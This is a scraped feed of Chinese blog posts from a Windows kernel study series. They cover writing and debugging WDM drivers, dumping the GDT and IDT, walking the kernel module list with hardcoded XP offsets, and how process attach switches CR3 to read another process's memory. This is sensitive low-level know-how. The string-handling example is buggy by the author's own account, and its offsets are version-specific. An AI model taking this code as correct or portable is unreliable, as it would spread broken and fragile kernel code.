写一个循环，遍历这个双向链表，打印出相应的信息 下面附上代码： c12345678910111213141516171819202122232425262728293031323334353637#include \"ntddk.h\"VOID Driver_Unload(PDRIVER_OBJECT driver);VOID EnumKernelModule(PDRIVER_OBJECT driver);NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING RegistryPath) { DbgPrint(\"Driver is running!\\n\"); EnumKernelModule(driver); driver->DriverUnload = Driver_Unload; return STATUS_SUCCESS;}VOID EnumKernelModule(PDRIVER_OBJECT driver) { UINT32 ds, dsCurrent; DbgPrint(\"_Driver_Object: %x\\n\", driver); DbgPrint(\"_LDR_DATA_TABLE_ENTRY: %x\\n\", driver->DriverSection); ds = (UINT32)(driver->DriverSection); dsCurrent = ds; DbgPrint(\"Name: %wZ, Base: %x, Size: %x\\n\", (PUINT32)(ds + 0x2c), *(PUINT32)(ds + 0x18), *(PUINT32)(ds + 0x20)); while (1) { ds = *(PUINT32)ds; if (ds == dsCurrent) { break; } DbgPrint(\"Name: %wZ, Base: %x, Size: %x\\n\", (PUINT32)(ds + 0x2c), *(PUINT32)(ds + 0x18), *(PUINT32)(ds + 0x20)); }}VOID Driver_Unload(PDRIVER_OBJECT driver) { DbgPrint(\"Unload Success!\");} 观察实验结果： 这里主要打印了模块名，基址以及大小。观察结构可以发现，内核模块中不仅包含驱动文件，还有一些系统的dll，exe。因为它们本质上都是PE结构，所以不论是驱动文件还是内核文件，在内核空间中，都是一种内核模块。 关系梳理之前，在学习完KPCR后，对进程结构体，线程结构体，KPCR进行了简单的关系梳理，不过需要指出一点，在后面分析线程切换函数SwapContext时也指出了，线程寻找进程，主要用的是KTHREAD+0x44偏移处的Process，而不是用ETHREAD+0x220的偏移处的EPROCESS，不过呢，通常情况下，这两个地方都可以用。 现在又学习完了驱动、内核相关的结构体，来看看它们之间的关系如何： 已知驱动遍历内核模块：PDRIVER_OBJECT -> DRIVER_OBJECT -> DriverSection -> _LDR_DATA_TABLE_ENTRY -> InLoadOrderLinks 遍历驱动结构体：PDRIVER_OBJECT -> DRIVER_OBJECT -> DriverSection -> _LDR_DATA_TABLE_ENTRY -> InLoadOrderLinks -> DllBase（模块名.sys） 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=60 参考文章：https://blog.csdn.net/qq_41988448/article/details/103514007 参考笔记：张嘉杰的笔记 参考代码：葫芦娃救爷爷，Joney，张嘉杰","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"内核编程基础","slug":"内核编程基础","date":"2020-04-09T09:10:07.576Z","updated":"2020-04-10T17:33:31.729Z","comments":true,"path":"2020/04/09/内核编程基础/","link":"","permalink":"http://cata1oc.github.io/2020/04/09/%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/","excerpt":"","text":"前面两篇文章分别介绍了驱动的编写以及调试驱动的方式，这一篇就对一些基础的概念以及注意事项做一个概括 内核API的使用 在应用层编程我们可以使用Windows提供的各种API函数，只要导入头文件就可以了，但是在内核编程的时候，我们不能像在Ring3那样直接使用。微软为内核程序提供了专用的API，只要在程序中包含相应的头文件就可以使用了，例如： c1#include \"ntddk.h\" //假定你已经正确安装了WDK 在应用层编程的时候，我们通过MSDN来了解函数的详细信息，在内核编程的时候，主要借助于官方文档 未导出函数的使用官方说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。如果要使用未导出的函数，只要自己定义一个函数指针，并且为函数指针提供正确的函数地址就可以使用了。获取未导出函数地址的方法有如下两种： 特征码搜索 解析内核PDB文件 基本数据类型 在内核编程的时候，尽量遵守WDK的编码习惯，不要这样写： c1unsigned long length; 尽量使用WDK自己的类型： c1234ULONG(unsigned long) PULONG(unsigned long *)UCHAR(unsigned char) PUCHAR(unsigned char *)UINT32(unsigned int) PUNIT32(unsigned int *) VOID(void) PVOID(void *) 返回值大部分内核函数的返回值都是NTSTATUS类型，如： c123NTSTATUS PsCreateSystemThread();NTSTATUS ZwOpenProcess();NTSTATUS ZwOpenEvent(); 这个类型的值用来说明函数执行的结果，例如： c123STATUS_SUCCESS 0x00000000 //成功STATUS_INVALID_PARAMETER 0xC000000D //参数无效STATUS_BUFFER_OVERFLOW 0x80000005 //缓冲区长度不够 当你调用的内核函数，如果返回的结果不是STATUS_SUCCESS，就说明函数执行中遇到了问题，具体是什么问题，可以参考ntstatus.h文件 内核中的异常处理在内核中，一个小小的错误就可能导致蓝屏，例如读写一个无效的内存地址。为了让自己的内核程序更加健壮，在编写内核程序时，使用异常处理是非常有必要的。 Windows提供了结构化异常处理(SEH)机制，大部分编译器都有支持，大致如下： c123456__try { //可能出错的代码}__except(filter_value){ //出错时要执行的代码} 出现异常时，可根据filter_value的值来决定程序该如何执行，filter_value的值主要如下： c123EXCEPTION_EXECUTE_HANDLER 1 //代码进入except块EXCEPTION_CONTINUE_SEARCH 0 //不处理异常，由上一层调用函数处理EXCEPTION_CONTINUE_EXECUTION -1 //回去继续执行错误处的代码 常用的内核内存函数简要介绍一些对内存进行使用的功能函数：申请、设置、拷贝以及释放 C语言 内核中 malloc ExAllocatePool memset RtlFillMemory memcpy RtlMoveMemory free ExFreePool 以ExAllocatePool为例，对应的语法为： c1234PVOID ExAllocatePool( POOL_TYPE PoolType, SIZE_T NumberOfBytes); 其中POOL_TYPE的类型主要有 c12345678910111213141516171819202122232425typedef enum _POOL_TYPE { NonPagedPool, //这块内存不可以放到文件中，用于存放代码 NonPagedPoolExecute, PagedPool, //这块内存不常用时可以放到文件中(硬盘)，用于存放数据 NonPagedPoolMustSucceed, DontUseThisType, NonPagedPoolCacheAligned, PagedPoolCacheAligned, NonPagedPoolCacheAlignedMustS, MaxPoolType, NonPagedPoolBase, NonPagedPoolBaseMustSucceed, NonPagedPoolBaseCacheAligned, NonPagedPoolBaseCacheAlignedMustS, NonPagedPoolSession, PagedPoolSession, NonPagedPoolMustSucceedSession, DontUseThisTypeSession, NonPagedPoolCacheAlignedSession, PagedPoolCacheAlignedSession, NonPagedPoolCacheAlignedMustSSession, NonPagedPoolNx, NonPagedPoolNxCacheAligned, NonPagedPoolSessionNx} POOL_TYPE; 内核字符串字符串种类内核中的字符串主要有4种： CHAR(char) WCHAR(wchar_t) ANSI_STRING c12345typedef struct _STRING { USHORT Length; USHORT MaximumLength; PCHAR Buffer;}STRING; UNICODE_STRING c12345typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer;}UNICODE_STRING; 使用ANSI_STRING和UNICODE_STRING的好处是其结构包含最大长度，可以有效防止字符串越界崩溃的情况 字符串常用函数字符串常用的功能无非就是：创建、复制、比较以及转换等等 ANSI_STRING字符串 UNICODE_STRING字符串 RtlInitAnsiString RtlInitUnicodeString RtlCopyString RtlCopyUnicodeString RtlCompareString RtlCompareUnicoodeString RtlAnsiStringToUnicodeString RtlUnicodeStringToAnsiString 一般在驱动中会通过DbgPrint函数格式化输出到DbgView上，上述字符串有如下对应关系： c1234\"%s\"---ANSI_STRING.Buffer\"%S\"---UNICODE_STRING.Buffer\"%Z\"---&ANSI_STRING\"wZ\"---&UNICODE_STRING 打印GDT，IDT在简要了解了内存函数和字符串函数后，来做两个实验巩固一下知识吧 第一个实验：申请一块内存，并在内存中存储GDT、IDT的所有数据，然后在DebugView中显示出来，最后释放内存 代码实现原来比较简单，主要是熟悉函数的使用，这里就不详细分析了，直接上代码 c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include \"ntddk.h\"VOID Driver_Unload(PDRIVER_OBJECT driver) { DbgPrint(\"Unload Success!\");}NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING RegistryPath) { USHORT gdtl, idtl; UINT32 idtr, gdtr; UCHAR gdt[6], idt[6]; PULONG pGDT, pIDT; _asm { sgdt gdt sidt idt } gdtl = *(PUSHORT)&gdt[0]; idtl = *(PUSHORT)&idt[0]; gdtr = *(PUINT32)&gdt[2]; idtr = *(PUINT32)&idt[2];// DbgPrint(\"%2x, %2x, %8x, %8x\\n\", gdtl, idtl, gdtr, idtr); gdtl++; idtl++; pGDT = ExAllocatePool(PagedPool, gdtl); pIDT = ExAllocatePool(PagedPool, idtl); if (pGDT == NULL || pIDT == NULL) { DbgPrint(\"Allocate Failed!\"); return STATUS_UNSUCCESSFUL; } RtlFillMemory(pGDT, gdtl, 0); RtlFillMemory(pIDT, idtl, 0); RtlMoveMemory(pGDT, (PUINT32)gdtr, gdtl); RtlMoveMemory(pIDT, (PUINT32)idtr, idtl); for (int i = 0; i < (gdtl/0x4); i += 0x4) { DbgPrint(\"%08x: %08x`%08x\\t%08x`%08x\\n\", gdtr+i, *(pGDT + i + 1), *(pGDT + i), *(pGDT + i + 3), *(pGDT + i + 2)); } for (int i = 0; i < (idtl/0x4); i += 0x4) { DbgPrint(\"%08x: %08x`%08x\\t%08x`%08x\\n\", idtr+i, *(pIDT + i + 1), *(pIDT + i), *(pIDT + i + 3), *(pIDT + i + 2)); } ExFreePool(pGDT); ExFreePool(pIDT); driver->DriverUnload = Driver_Unload; return STATUS_SUCCESS;} 测试结果 截取GDT部分内容 ： 截取IDT部分内容： Windbg中打印部分内容验证结果是否正确： 字符串操纵第二个实验，应用刚刚学习的字符串函数，操纵字符串实现如下功能： 初始化一个字符串 拷贝一个字符串 比较两个字符串是否相等 进行ANSI_STRING与UNICODE_STRING的转化 代码实现c12345678910111213141516171819202122232425262728293031323334353637383940414243#include VOID Driver_Unload(PDRIVER_OBJECT driver);VOID Manipulate();NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { DbgPrint(\"Load Driver\"); Manipulate(); DriverObject->DriverUnload = Driver_Unload; return STATUS_SUCCESS;}VOID Manipulate() { ANSI_STRING aStr, bStr = {0}, cStr, dStr; UNICODE_STRING uStr; ULONG ul; //Initialize RtlInitAnsiString(&aStr, \"TestANSI\"); RtlInitAnsiString(&cStr, \"TestCOMPARE\"); RtlInitUnicodeString(&uStr, \"TestUnicode\"); DbgPrint(\"%x, %x, %s\", aStr.Length, aStr.MaximumLength, aStr.Buffer); DbgPrint(\"%x, %x, %s\", cStr.Length, cStr.MaximumLength, cStr.Buffer); DbgPrint(\"%x, %x, %s\", uStr.Length, uStr.MaximumLength, uStr.Buffer); //Copy RtlCopyString(&bStr, &aStr); DbgPrint(\"%x, %x, %s\", bStr.Length, bStr.MaximumLength, bStr.Buffer); //Compare ul = RtlCompareString(&aStr, &cStr, 1); DbgPrint(\"%d\", ul); //Transfer RtlUnicodeStringToAnsiString(&dStr, &uStr, TRUE); DbgPrint(\"%x, %x, %s\", dStr.Length, dStr.MaximumLength, dStr.Buffer);}VOID Driver_Unload(PDRIVER_OBJECT driver) { DbgPrint(\"Unload Success!\");} 测试结果 由结果可以看出，代码测试存在问题，请教了Joney，他猜测其原因在于，可能由于编译器的优化，定义的字符串结构体仅仅是引用了字符串常量（在常量区，无法写），并没有真正获取它，因而在进行拷贝操作时，无法获取另一个字符串结构体的内容。猜想没有去验证，因为我太懒了，字符串这东西，真的是麻烦，以后用到的话，会在研究一下的……. 参考教程：https://www.bilibili.com/video/av68700135?p=59 参考笔记：张嘉杰的笔记 参考代码：Joney的代码，葫芦娃救爷爷的代码","categories":[],"tags":[]},{"title":"驱动调试","slug":"驱动调试","date":"2020-04-08T01:47:11.000Z","updated":"2020-04-08T07:05:16.222Z","comments":true,"path":"2020/04/08/驱动调试/","link":"","permalink":"http://cata1oc.github.io/2020/04/08/%E9%A9%B1%E5%8A%A8%E8%B0%83%E8%AF%95/","excerpt":"","text":"之前介绍了如何编写一个简单的驱动程序，相比exe程序，可以直接拖进OD内调试，驱动文件必须依赖操作系统才能执行。所以需要依靠Windbg进行双机调试来实现（配置双机调试可以参考这里）。具体如何调试驱动，下面一起来看看吧 PDB文件在学习驱动调试之前，先要了解PDB文件。PDB文件（Program DateBase File）有什么用呢？我们来看个例子： 在Windbg中，通过u（unassemble）指令可以看到指定地址的汇编；当我们给定一个特定的地址时，它往往可以识别出这个函数，亦或是给定一个函数名，它可以直接定位到特定的地址 这到底是如何做到的呢？ 我们先看定义，PDB文件是一类用于存储程序调试信息的属性文件。它会伴随着源文件编译时创建出来。 结合上图和定义可以发现，无论是exe，dll还是sys文件，都有对应的pdb文件，且pdb文件体积很大，这是因为pdb包含了大量调试用的信息，这也是为什么Windbg能够快速识别各类0环函数信息，因为它加载了Windows符号表。Windows符号表是一组包含了内核函数调试信息的pdb文件。 加载符号表加载符号表的步骤非常简单，之前进行过双击调试的小伙伴应该已经自行加载过了，这里再演示一遍： 进入Windbg界面，File -> SymbolFilePath 进入后，可以看到，这是我导入的Windows符号表，里面包含了内核函数的pdb文件 由于Windows官方不再提供符号表，这里我使用的是Xp sp3的符号表，可以作为参考(提取码：3akx ) 实际情况最好选择与操作系统版本相适应的符号表 导入符号表后，在Windbg中键入.reload指令完成符号信息加载 驱动调试示例有了前面的基础，我们来尝试一下如何调试一个驱动程序吧 首先，写一个驱动程序，加入用于测试的代码 Code12345678910111213141516171819202122#include \"ntddk.h\"VOID DriverUnload(PDRIVER_OBJECT driver){ DbgPrint(\"驱动程序已停止.\\r\\n\");}NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath){ //中断到调试器 _asm { int 3 mov eax, eax mov eax, eax mov ecx, ecx } DbgPrint(\"驱动程序已运行.\\r\\n\"); DriverObject->DriverUnload = DriverUnload; return STATUS_SUCCESS;} 这里面嵌入了一段汇编，这样可以在程序执行时中断到调试器 然后，我们将该驱动程序的pdb文件路径拷贝到Windbg的SymbolFilePath中 这样Windbg就加载了我们驱动程序的符号文件了 有了符号文件，就可以用Windbg调试驱动了： 将驱动程序复制到调试机器，运行后发现会操作系统卡死 进入Windbg发现程序中断到了int 3指令的位置，并在左边显示了咱们编写的驱动程序 执行t指令可以进行单步调试 调试完后可键入g指令继续执行程序 这样，一次简单的驱动调试就完成啦 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=58 参考文章： https://blog.csdn.net/qq_41988448/article/details/103497372 https://blog.csdn.net/q1007729991/article/details/52710390","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"第一个驱动程序","slug":"第一个驱动程序","date":"2020-04-07T07:15:54.000Z","updated":"2020-04-07T08:49:05.568Z","comments":true,"path":"2020/04/07/第一个驱动程序/","link":"","permalink":"http://cata1oc.github.io/2020/04/07/%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"在完成了进程和线程的学习后，我们发现，很多实验都受限于权限的限制，很难直接操纵0环的结构，然而，依靠中断门等提权方式进入0环，需要手动在Windbg中设置段描述符，就会变得很麻烦。而驱动恰恰可以解决这个问题，驱动可以直接和操作系统打交道，话不多说，开始驱动的学习吧。 环境配置搭建环境及工具 Visual Studio 2017：下载地址 WDK（Windows Driver Kit）:下载地址 DbgView：下载地址 KmdManager 先安装Visual Studio 2017在本机，再安装WDK到本机。DbgView和KmdManager则安装至虚拟机上。因为驱动若发生错误，则会导致系统崩溃，因而选择在虚拟机上进行实验。 项目创建 安装完VS2017后，要安装SDK，且版本要与WDK的版本一致，如图我的SDK版本是17763 那么安装的WDK版本，也得是17763 校验好版本后，来创建驱动程序，新建项目 -> Visual C++ -> 测试 -> Legacy -> Empty WDM Driver 有人可能会问了，为什么要创建WDM的驱动程序，而不创建WDF的驱动程序呢？因为如果创建了WDF的驱动程序，在xp上执行会发生系统找不到指定文件的错误 具体原因也不是很清楚，至于这俩的区别可以参考WDM和WDF之间的差异 接着点击确定，即可创建驱动程序项目了，但是需要注意一点，就是第一步中，SDK和WDK的版本必须要一致，否则会出现一个奇怪的错误 如果版本相同，就不会出现这样的错误啦 项目属性配置 右键项目，进入属性页，来配置一下项目的属性 接下来按照图中框中地方进行矫正即可 配置完即可创建文件了 编写第一个驱动程序创建过程 依然是按部就班的来，右键SourceFiles创建源文件 这里后缀名要用的c的，因为如果编写c++程序的驱动的话，编译器会做过多的优化，因而无法做到指令级别的掌控 修改文件编译属性，由于刚刚没有创建源文件，所以在项目属性配置时，并不能配置完全部属性，这里需要再配置一下 编写驱动代码，具体如下 c12345678910111213141516#include \"ntddk.h\"//卸载函数VOID DriverUnload(PDRIVER_OBJECT driver){ DbgPrint(\"驱动程序已停止.\\r\\n\");}//驱动程序入口函数，相当于控制台的main函数NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath){ DbgPrint(\"驱动程序已运行.\\r\\n\"); //设置一个卸载函数 便于退出 DriverObject->DriverUnload = DriverUnload; return STATUS_SUCCESS;} 选择生成HelloDriver 结果验证 将HelloDriver/Debug目录下的HelloDriver.sys复制进虚拟机Windows Xp中 打开DbgView，勾选Capture Kernel选项，用于捕获内核调试信息 打开KmdManager，导入HelloDriver.sys，注册并运行，验证结果。 总结总体不难，但是第一次搞驱动，踩了不少坑，最终还是花了一个上午的时间才弄好。真的非常感谢Joney老大解答问题，这让我少花了很多时间，不然我可能搞到晚上都弄不出来。。。 参考文章： https://blog.csdn.net/qq_41988448/article/details/103456086 https://blog.csdn.net/liny000/article/details/81260385 https://docs.microsoft.com/zh-cn/windows-hardware/drivers/wdf/differences-between-wdm-and-kmdf","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"跨进程读写内存","slug":"跨进程读写内存","date":"2020-04-05T17:15:42.000Z","updated":"2020-04-07T13:18:56.576Z","comments":true,"path":"2020/04/06/跨进程读写内存/","link":"","permalink":"http://cata1oc.github.io/2020/04/06/%E8%B7%A8%E8%BF%9B%E7%A8%8B%E8%AF%BB%E5%86%99%E5%86%85%E5%AD%98/","excerpt":"","text":"要点回顾跨进程的本质是“进程挂靠”，正常情况下，A进程的线程只能访问A进程的地址空间，如果A进程的线程想访问B进程的地址空间，就要修改当前的Cr3的值为B进程的页目录表基址（KPROCESS.DirectoryTableBase） 即： Code1mov cr3, B.DirectoryTableBase 跨进程操作A进程中的线程代码如下： Code1234mov cr3,B.DirectoryTableBase //切换Cr3的值为B进程mov eax,dword ptr ds:[0x12345678] //将进程B 0x12345678的值存的eax中mov dword ptr ds:[0x00401234],eax //将数据存储到0x00401234中mov cr3,A.DirectoryTableBase //切换回Cr3的值 这是一个模拟跨进程读写内存的操作，但是代码实际上是存在问题的。代码中，将数据写入到0x00401234这个地址里，但这个地址是位于B进程地址空间的，因此A进程中是无法读出来这个值的。那该如何读写另一个进程的内存呢？ 之前，在学习保护模式内容的时候，发现不同进程低2G对应的物理页往往是不同的，但是高2G对应的物理页往往是相同的。可以利用这一点，可以先将数据暂存到高2G的内存，然后切换到另一个进程中，进入读写操作。具体我们来参考一下NtReadVirtualMemory的实现理念。 NtReadVirtualMemory流程 NtWriteVirtualMemory流程 通过分析这两个函数实现跨进程读写的原理可以发现，都是利用了进程高2G地址对应的物理页相同这个特性，先将数据暂存到高2G的位置，然后切换进程，再在另一个进程是进行读取操作。 总结这篇比较简短，进程和线程的也算是收尾了。当然，的确也没有太多内容，算是水了一篇吧，至于手动实现跨进程的实验，就搁置了，再次复习时，或许会在后续单独写一篇来更新吧。 写这篇的时候，已经是4月6号晚上了，自3月5号开始更新博客以来，过去整整一个月了。有时候还是会很怠慢，部分没有更新完拖到第二天的情况也很常见，好在，还是坚持了下来。进入Q2了，这对我来说非常关键，按照计划，也应该在6月21日之前更新完内核相关的内容，当然，实际进度或许更快一些，但我却有些着急了，这是不该的，稳扎稳打，才是最稳妥的。第一个月下来，对自己的打分勉强及格吧。但这算是开始，相比之前的颓废，情况有些好转了，Q2是至关重要的，等4月下旬，按照顺序更新完APC，我可能会开始更新一些Android安全或者Web安全自己学习过的内容，作为复习的同时，也算是强化自身的技能池吧，虽然很早就说了更Android，但是正向方面一直不是很了解，加上平时更新内核也比较慢，也就鸽了。对我来说，4月6号，是比较重要的第一天吧，2017年那天的凌晨，因为失眠，发了脾气。2017.4.5~4.15这段在滨海新区前端学习的时光，我依旧记得，虽然有一些不快，但是却印象深刻，我忘不了某一天晚上结束后在等大巴车时吹的海风，虽然距离海边还有很远的距离，而且还冷飕飕的，比在厦门晚上吹的海风还冷一些，但是能给人这种感觉的，也只有海边吹来的风了。我忘不了那段时间早起，晚归，过了0点才入睡，专注于学习的时光，后来我在想，这可能是我大学最努力的时光了吧，现在毕业了一年了，发现，的确是的。虽然没有初三那段时间那么拼命，但是，真的疲惫了，真的投入了，真的尽力了。对我来说，那是段还不错的记忆，尽管过去了这么久。有句话说，中年人（虽然我才23）别总回忆过去，才不会令人讨厌。可是没办法，这的确是特殊的一天，2017.4.6的早上，一整夜一分钟都没睡着的我，拖着疲惫的身躯，上了去公司的大巴车，在车上，我循环着Maroon5的Cold，睡了一小会，今天，我又循环了很多遍这首歌，循着承载着记忆的歌。回忆了这么多，难免人会有些失落，是啊，下一次吹海风会是什么时候呢。失落不总是差的，但也不能总是失落，人总得找到轻松的方法获得快乐才行。难得，矫情了一下，博客，还是要继续更新的，现在的我比以前更现实了，实力才是生活的保证，坚持学习，不断提升自身的技能池吧","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"进程挂靠","slug":"进程挂靠","date":"2020-04-05T00:46:28.000Z","updated":"2020-04-06T14:32:21.935Z","comments":true,"path":"2020/04/05/进程挂靠/","link":"","permalink":"http://cata1oc.github.io/2020/04/05/%E8%BF%9B%E7%A8%8B%E6%8C%82%E9%9D%A0/","excerpt":"","text":"在学习进程挂靠之前，先回顾一下进程与线程相关的知识 进程与线程的关系基本关系 一个进程可以包含多个线程 一个进程至少要有一个线程 进程为线程提供资源，也就是提供Cr3的值，Cr3中存储的是页目录表基址，Cr3确定了，线程能访问的内存也就确定了。 代码分析来看这样一行代码： Code1mov eax,dword ptr ds:[0x12345678] CPU如何解析0x12345678这个地址呢？ CPU解析线性地址时，需要通过页目录表（PDT）来找到对应的物理页，页目录表基址存在Cr3寄存器中，这些都是保护模式的内容，已经很熟悉了 当前的Cr3的值来源于当前的进程（_KPROCESS.DirectoryTableBase(+0x018)） 线程找进程线程找进程有两种情况： KHTREAD.ApcState.Process(+0x44) ETHREAD.ThreadProcess(+0x220) 所以，从KTHREAD以及ETHREAD均能找到当前线程的进程，这里引用海哥的叫法，把KTHREAD找到的Process(+0x44)叫做养父母，把ETHREAD找到的ThreadProcess(+0x220)叫做亲生父母 养父母负责提供Cr3线程切换的时候，会比较KTHREAD结构体0x044处指定的EPROCESS是否为同一个，如果不是同一个，会将0x044处指定的EPROCESS的DirectoryTableBase的值取出，赋值给Cr3。这部分在分析SwapContext的Part3部分提到过，这里不多赘述。可以跳转或者参考下图的紫色部分 所以，线程所需要的Cr3的值，来源于0x044偏移处指定的EPROCESS，所以得出如下结论： 0x220：亲生父母，这个线程谁创建的 0x044：养父母，谁在为这个线程提供资源（也就提供Cr3）。一般情况下，0x220与0x044指向的是同一个进程 进程挂靠有了上述概念后，我们知道了，正常情况下，Cr3的值是由养父母提供的，但是Cr3的值也可以改成和当前线程毫不相干的其它进程的DirectoryTableBase。 观察下面的代码： Code123456mov cr3,A.DirectoryTableBasemov eax,dword ptr ds:[0x12345678] //A进程的0x12345678内存mov cr3,B.DirectoryTableBasemov eax,dword ptr ds:[0x12345678] //B进程的0x12345678内存mov cr3,C.DirectoryTableBasemov eax,dword ptr ds:[0x12345678] //C进程的0x12345678内存 将当前Cr3的值改为其它进程，称为“进程挂靠”。 进程挂靠存在的意义是什么呢，上面的代码，分别将不同进程的DirectoryTableBase的值写入Cr3。这时，每次读入的0x12345678这个线性地址上的值，分别是对应进程上0x12345678线性地址所对应物理页的内容。有了进程挂靠，就意味着可以读取其它进程的内存。 分析NtReadVirtualMemory我们知道，ReadProcessMemory这个三环API是可以读取其它进程的内存的，该函数在0环的实现是NtReadVirtualMemory，来分析一下这个函数，看看它是如何读取其它进程内存的： 首先，进入NtReadVirtualMemory，由于这个函数非常复杂，就直接挑重点来说了 这里调用了一个_MmCopyVirtualMemory函数，看名字就感觉，这个和别的进程的内存可能有点关系，毕竟是Copy来的…. 进入_MmCopyVirtualMemory继续查看 这个函数不大，有一个函数很关键MiDoPoolCopy，这个函数Push了一大堆参数，内部应该实现了重要的功能，继续更近 跟进_MiDoPoolCopy函数 往下翻，有一个KeStackAttachProcess，由名字可知，这个函数和进程挂靠有关 再进一步，进入_KeStackAttachProcess函数 看到这里，就是真正的挂靠函数，进入分析看看Windows到底是如何实现进程挂靠的 直接看图 这里面进行了两个主要的操作： 1）修改养父母，即KTHREAD.ApcState.Process的值，修改为将要访问的进程的进程结构体 2）调用进程切换函数KiSwapProcess（本质是切换Cr3） 进入KiSwapProcess看看这个函数具体做了什么 来看最关键的部分，KiSwapProcess函数，先从外部参数，获取到了将要访问的进程的Cr3，然后分别修改TSS.Cr3和KPROCESS+0x18（DirectoryTableBase）处的值，然后便完成了进程切换。可以发现，进程切换，实际上就是切换了Cr3 小结简要分析完了NtReadVirtualMemory函数后可以发现，这个函数主要做了两件事，第一件事，修改线程养父母，第二件事，修改进程Cr3。随后就可以访问和读取另一个进程的内存了。 那么小盆友要问了，可不可以只修改Cr3，而不修改养父母呢？当然是不可以的，如果不修改养父母的值，一旦发生线程切换，再切回来的时候，读取的内存，是由养父母提供的Cr3，而养父母没有修改，因此读取的还是自己线程所在的进程，即变成了自己读自己了。 总结正常情况下，当前线程使用的Cr3是由其所属进程提供的（KTHREAD+0x44偏移处指定的EPROCESS），正是因为如此，A进程中的线程只能访问A的内存。 如果要让A进程中的线程能够访问B进程的内存，就必须要修改Cr3的值为B进程的页目录表基址（B.DirectoryTableBase），这就是所谓的“进程挂靠” 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=54 参考文章： https://blog.csdn.net/weixin_42052102/article/details/83268680 https://blog.csdn.net/qq_38474570/article/details/104286261 https://blog.csdn.net/qq_41988448/article/details/103435464","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"线程优先级","slug":"线程优先级","date":"2020-04-04T14:04:35.000Z","updated":"2020-04-06T08:12:02.884Z","comments":true,"path":"2020/04/04/线程优先级/","link":"","permalink":"http://cata1oc.github.io/2020/04/04/%E7%BA%BF%E7%A8%8B%E4%BC%98%E5%85%88%E7%BA%A7/","excerpt":"","text":"前面分析过了SwapContext函数，用来线程切换的；线程切换需要2个线程，一个是当前线程，一个是用来切换的目标线程，我们知道当前线程可以通过KPCR+0x124位置的CurrentThread获得，那么目标线程该如何获得呢？下面一块来研究一下 线程切换的方式先回顾一下线程切换三种方式的过程： 当前线程主动调用API： API函数 -> KiSwapThread -> KiSwapContext -> SwapContext 当前线程时间片到期： KiDipatchInterrupt -> KiQuantumEnd -> SwapContext KPCR中存有备用线程： KiDispatchInterrupt -> SwapContext 在有备用线程的条件下，SwapContext的目标线程参数可以通过(KPCR.PrcbData.NextThread)直接取出。那么另外两种方式，是如何找到下一个要切换的线程呢？ 先看主动调用API的方式，进入IDA分析一下KiSwapContext函数执行之前的流程 由图，我们可以看出，KiSwapThread函数内，会先执行KiFindReadyThread取出目标线程，之后再执行KiSwapContext函数的 再看时间片到期的方式，我们进入KiQuantumEnd进行分析 发现，KiQuantumEnd内部，也会先执行KiFindReadyThread函数，返回一个线程结构体 通过分析可以得知，线程切换的目标线程，与KiFindReadyThread有关，接下来就结合KiFindReadyThread函数来分析一下如何获取目标线程。 线程查找在分析查找线程之前，我们先来回顾一下之前学习的调度链表的知识 调度链表共32个，如果说一个线程，它满足运行条件了，就会被扔到这个链表里面(根据优先级)，也就是说，线程切换的时候，就是从这个调度链表里面找一个线程出来，而KiFindReadyThread函数就是干这事的。 KiFindReadyThread查找方式这个函数的查找方式非常简单暴力，会按照优先级别进行查找：31..30..29..28 换句话说，在本次查找中，如果级别31的链表里面有线程，那么就不会查找级别为30的链表，直接从级别31的链表里取一个出来 如何高效查找调度链表有32个，如果每次都从开始查找效率就太低了，因此Windows通过一个DWORD类型的变量来记录： 当向调度链表（32个）中挂入或者摘除某个线程时，会判断当前级别的链表是否为空，会判断当前级别的链表是否为空，为空则将DWORD变量（_KiReadySummary）对应位置0，否则置1。大致如下图： 多CPU下会随机寻找KiDispatcherReadyListHead指向的数组中的线程。线程可以绑定某个CPU（使用API：setThreadAffinityMask） 如果没有就绪线程怎么办这里我们先了解一下如何看调度链表 大致分三种情况： 双向链表的值一样，且等于当前地址，说明该链表是空的 双向链表的值一样，但是不等于当前地址，说明该链表只有一个线程 双向链表的值不一样，说明链表中存在2个或者2个以上个线程 那么，如果32个调度链表都是空的怎么办？ 我们来进入IDA看一下执行流程： 查看KiFindReadyThread执行后的代码 若eax值为空（即没有取到线程）那么会跳转到loc_8000EA85的位置执行 来看看loc_8000EA85处做了什么 实际上只做了一件事，就是给eax赋值，因为KiFindReadyThread函数没有找到就绪线程，因此eax值是空的，这里给eax赋的值，就是KPCR.PrcbData.IdleThread。也就是KPCR中存着的空闲线程 这下我们弄明白了，如果就绪链表中没有线程，那么发生线程切换时，会切换到一个Idle线程继续执行，从而保证CPU一直稳定的执行 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=53 参考文章： https://blog.csdn.net/qq_38474570/article/details/104286223 https://blog.csdn.net/qq_41988448/article/details/103435464 